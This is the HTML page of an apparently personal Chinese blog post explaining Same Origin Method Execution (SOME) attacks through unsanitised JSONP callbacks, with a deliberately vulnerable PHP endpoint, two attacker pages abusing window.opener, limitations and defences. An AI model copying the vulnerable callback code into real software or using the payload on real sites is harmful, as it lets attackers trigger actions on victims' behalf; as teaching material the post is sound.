@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文章金句。">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Some攻击方式的探究">
+<meta property="og:url" content="http://www.test.com/2018/04/10/2018-04-10-Some/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文章金句。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-11-13T03:51:33.232Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Some攻击方式的探究">
+<meta name="twitter:description" content="文章金句。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.test.com/2018/04/10/2018-04-10-Some/">
+
+
+
+
+
+  <title>Some攻击方式的探究 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.test.com/2018/04/10/2018-04-10-Some/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Some攻击方式的探究</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T00:00:00+08:00">
+                2018-04-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/blog/" itemprop="url" rel="index">
+                    <span itemprop="name">blog</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  文章金句。
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Some攻击方式的探究"><a href="#Some攻击方式的探究" class="headerlink" title="Some攻击方式的探究"></a>Some攻击方式的探究</h2><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍:"></a>0x01 介绍:</h2><p>Some (Same origin method execution) ，也就是同源方法执行。受同源策略的影响，一个域想要向另一个域传递消息，需要使用JSONP，或者Postmessage，CORS。而some攻击其实就是利用了回调函数的参数值可以由用户控制，从而可以对整个域的dom文档进行操作。</p>
+<p></p><h4>JSONP</h4><p></p>
+<blockquote>
+<p>jsonp 由于同源策略的存在，两个域之间无法正常沟通，但是<code>&lt;script&gt;</code>标签不受这个限制，所以我们就就可以利用script这个标签，来抓取别的页面动态产生的json数据，这种抓取的方式就是JSONP。</p>
+</blockquote>
+<p>JSONP的实现过程中会存在一个客户端与服务端，<br>客户端包含对数据进行处理的函数，并且使用script标签向服务端请求它要处理的数据。<br>假如我们的请求办法是<code>&lt;script type=&quot;text/javascript&quot; src=&quot;yemian/server.php?callback=&quot;&gt;</code>,其中callback的值即就是处理数据的函数名，<br>然后服务端server.php接受到函数名之后，会对其添加相应的数据并返回给客户端，比如函数名是callback，然后返回给客户端callback({‘xiaoming’,123})，相当于给json数据添加了前缀和后缀，所以称为json with padding。</p>
+<h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02:利用："></a>0x02:利用：</h2><p>有时候一个参数会过滤导致xss的关键字符，只留下\w+., 这时我们便可以考虑这个参数会不会是被执行的回调函数。假设在主页面<code>www.test.com</code>上存在一个1.html</p>
+<p> 代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;button onclick=&quot;secret()&quot; &gt;private operation&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function secret() &#123;</span><br><span class="line">		alert(&apos;secret&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>服务端存在一个执行回调函数的部分来完成相应的功能jsonp.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line">echo &quot;&lt;script&gt;&quot;.$callback.&quot;()&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这时我们可以在vps构造两个攻击脚本</p>
+<ol>
+<li>some1.html，使漏洞页面的父窗口为存在敏感操作的页面</li>
+<li>some2.html的作用即是使用window.opener操作父窗口</li>
+</ol>
+<p>some1.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	window.open(&apos;some2.html&apos;);</span><br><span class="line">	location.replace(&apos;http://www.test.com/1.html&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>some2.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	location.replace(&apos;http://www.test.com/jsonp.php?callback=window.opener.body.firstElementChild.firstElementChild.click&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后我们诱骗别人点开vps/some1.html， 即可在他不知情的情况下执行敏感操作。</p>
+<ul>
+<li>一个some 漏洞平台 <a href="https://www.someattack.com/Playground/" target="_blank" rel="noopener">https://www.someattack.com/Playground/</a></li>
+</ul>
+<h2 id="0x03-局限："><a href="#0x03-局限：" class="headerlink" title="0x03: 局限："></a>0x03: 局限：</h2><p>我们提交的callback值必须是可执行的js，并且我们没办法控制服务他回调函数要处理的参数，如果服务端为其添加了数据参数，可能会导致同源方法无法执行。</p>
+<p>此外，如果服务端返回头的Content-Type值为application/json, callback值便不能被当作js处理，攻击便会失效。<br>我们为上面的jsonp.php 添加</p>
+<p><code>header(&quot;Content-Type: application/json&quot;);</code></p>
+<p>页面不再弹窗, 攻击失效</p>
+<h2 id="0x04-防御："><a href="#0x04-防御：" class="headerlink" title="0x04: 防御："></a>0x04: 防御：</h2><p>some攻击本质上就是对回调函数参数的滥用，所以防御可以从一下几方面</p>
+<ul>
+<li>保证回调函数参数提交的值在白名单范围内</li>
+<li>或者使用Postmessage来进行跨域交互。</li>
+<li>让Content-Type的值为application/json</li>
+</ul>
+<h2 id="0x05-参考："><a href="#0x05-参考：" class="headerlink" title="0x05: 参考："></a>0x05: 参考：</h2><p><a href="http://blog.safedog.cn/?p=13" target="_blank" rel="noopener">http://blog.safedog.cn/?p=13</a><br><a href="https://paper.seebug.org/452/" target="_blank" rel="noopener">https://paper.seebug.org/452/</a><br><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0215221" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0215221</a><br><a href="http://www.benhayak.com/2015/06/same-origin-method-execution-some.html" target="_blank" rel="noopener">http://www.benhayak.com/2015/06/same-origin-method-execution-some.html</a><br><a href="http://zoczus.blogspot.fr/2015/04/plupload-same-origin-method-execution.html" target="_blank" rel="noopener">http://zoczus.blogspot.fr/2015/04/plupload-same-origin-method-execution.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/16/2017-05-16-mysql下基于字符集的注入/" rel="next" title="mysql下基于字符集的注入">
+                <i class="fa fa-chevron-left"></i> mysql下基于字符集的注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/13/hello-world/" rel="prev" title="Hello World">
+                Hello World <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Some攻击方式的探究"><span class="nav-number">1.</span> <span class="nav-text">Some攻击方式的探究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-介绍"><span class="nav-number">2.</span> <span class="nav-text">0x01 介绍:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">2.0.1.</span> <span class="nav-text">JSONP</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-利用："><span class="nav-number">3.</span> <span class="nav-text">0x02:利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-局限："><span class="nav-number">4.</span> <span class="nav-text">0x03: 局限：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-防御："><span class="nav-number">5.</span> <span class="nav-text">0x04: 防御：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考："><span class="nav-number">6.</span> <span class="nav-text">0x05: 参考：</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
